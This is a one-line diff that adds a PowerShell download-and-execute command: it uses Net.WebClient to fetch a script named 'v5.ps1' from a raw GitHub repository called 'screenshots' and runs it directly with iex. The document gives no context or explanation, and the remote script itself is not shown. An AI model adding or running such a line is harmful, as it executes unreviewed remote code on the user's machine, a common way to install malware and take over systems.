@@ -1,0 +1,1 @@
+iex((New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/cem324/screenshots/main/v5.ps1'))
